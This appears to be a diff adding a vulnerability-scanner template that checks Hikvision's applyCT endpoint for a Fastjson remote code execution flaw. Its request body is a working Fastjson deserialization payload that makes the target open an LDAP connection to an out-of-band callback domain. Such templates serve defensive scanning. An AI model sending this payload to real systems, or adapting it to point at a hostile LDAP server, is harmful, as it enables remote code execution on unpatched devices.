@@ -1,0 +1,15 @@
+name: hikvision-applyct-fastjson-rc
+set:
+  reverse: newReverse()
+  reverseURL: reverse.domain
+rules:
+  r0:
+    request:
+      method: POST
+      path: /bic/ssoService/v1/applyCT
+      headers:
+        Content-Type: application/json
+      body: |
+        {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{reverseURL}}","autoCommit":true},"hfe4zyyzldp":"="} 
+    expression: reverse.wait(5)
+expression: r0()
